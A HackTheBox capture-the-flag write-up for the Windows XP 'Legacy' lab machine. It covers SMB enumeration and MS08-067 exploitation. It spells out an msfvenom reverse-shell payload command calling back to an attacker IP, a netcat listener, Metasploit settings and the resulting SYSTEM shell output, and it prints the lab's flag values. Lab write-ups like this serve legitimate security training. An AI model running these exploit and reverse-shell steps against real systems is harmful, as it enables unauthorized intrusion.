---
layout: single
title:  "HackTheBox - Legacy"
categories: 
  - HTB Easy
tags:
  - htb
  - htb-easy
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: ""
author_profile: false
sidebar:
  nav: "navbar"
---

## Initial Enumeration

`nmap -sC -sV -v --min-rate=1000 10.10.10.4 -oA nmap/legacy`

```
Nmap scan report for 10.10.10.4
Host is up (0.0072s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-08-08T21:14:54+03:00
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:31:79 (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|_  LEGACY<20>           Flags: <unique><active>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h18m58s, deviation: 2h07m16s, median: 4d22h48m58s
```

We note that SMB ports are opened. Furthermore, the host OS is Windows XP. As the name of the machine suggests, this is indeed a legacy OS that is vulnerable to various exploits.

For more in-depth information, I ran `nmap` again with `smb` script scans.

```
Nmap scan report for 10.10.10.4
Host is up (0.0082s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-08-08T21:25:25+03:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-print-text: false
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (Could not negotiate a connection:SMB: Failed to receive bytes: EOF)
|   account_used: <blank>
|   \\10.10.10.4\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
| smb-mbenum: 
|_  ERROR: Call to Browser Service failed with status = 2184
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-capabilities: SMB 2+ not supported
|_smb-vuln-ms10-054: false
| smb-brute: 
|_  No accounts found
| smb-protocols: 
|   dialects: 
|_    NT LM 0.12 (SMBv1) [dangerous, but default]

```

In the meantime, I tried to enumerate and interact with the SMB shares. However, we find that NULL session authentication is not possible here.

Using `smbmap`:

```
$ smbmap -H 10.10.10.4 -u aaa --depth 5

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                   
[*] Detected 1 hosts serving SMB
[*] Established 0 SMB connections(s) and 0 authenticated session(s)             
[*] Closed 0 connections
```

Using `smbclient` and `rpcclient`:

```
$ smbclient -N -L \\\\10.10.10.4        
session setup failed: NT_STATUS_INVALID_PARAMETER
```

```
$ rpcclient -U "" 10.10.10.4
Password for [WORKGROUP\]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

## Foothold

From the script scan, we note the following:

* SMBv1 is being used.
* The host is vulnerable to EternalBlue (MS17-010).

If we search for OS-specific vulnerabilities, we get the following:

* MS08-067
* MS08-068
* Some buffer overflow exploit from 2002 on `ExploitDB`.

We will try to run the `MS08-067` exploit. This exploit is available on `Metasploit`.

However, on my first try running the exploit, I found that it wasn't working properly for me.

I then tried a PoC exploit off GitHub. The PoC exploit requires us to inject shell code into the script as a payload (to spawn a reverse shell). We can generate this shell code through `msfvenom`:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=6200 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows`

Then start a listener:

`nc -lnvp 6200`

Likewise, the PoC exploit was not working for me:

```
$ python3 ms08_067_2018.py 10.10.10.4 6 445
<SNIP>
[-]Initiating connection
Exception in thread Thread-1:
<SNIP>
impacket.smb.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.

During handling of the above exception, another exception occurred:

<SNIP>
impacket.smbconnection.SessionError: SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
```

I then decided to reset the machine and try `Metasploit` again.

```
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
LHOST => 10.10.14.23
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.23:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176198 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.4:1032) at 2024-08-03 13:21:00 -0400

meterpreter > shell
Process 1940 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

The exploit now works correctly after a reset.  As we have SYSTEM access, we can capture both `root` and `user` flags.

```
C:\WINDOWS\system32>type C:\"Documents and Settings"\Administrator\Desktop\root.txt
type C:\"Documents and Settings"\Administrator\Desktop\root.txt
993442d258b0e0ec917cae9e695d5713
C:\WINDOWS\system32>type C:\"Documents and Settings"\john\Desktop\user.txt
type C:\"Documents and Settings"\john\Desktop\user.txt
e69af0e4f443de7e36876fda4ec7644f
```

I also then decided to try the PoC exploit again. As expected, the PoC exploit also worked correctly after a reset.

```
$ python3 ms08_067_2018.py 10.10.10.4 6 445
<SNIP>

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

```
$ nc -lnvp 6200
listening on [any] 6200 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.4] 1033
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

## Caveats

Oddly enough, after exiting the reverse shell created from the PoC exploit, the same errors appear if I try to run the same exploits again (from both `msfconsole` and through the PoC exploit).

I'm assuming that the PoC exploit somehow broke the SMB connection on the target, though I haven't really explored this further.

I'm not sure if its because the wrong OS version was used (I accidentally ran the exploit with OS option 1 instead of 6 afterwards), or because the PoC exploit itself breaks the system.
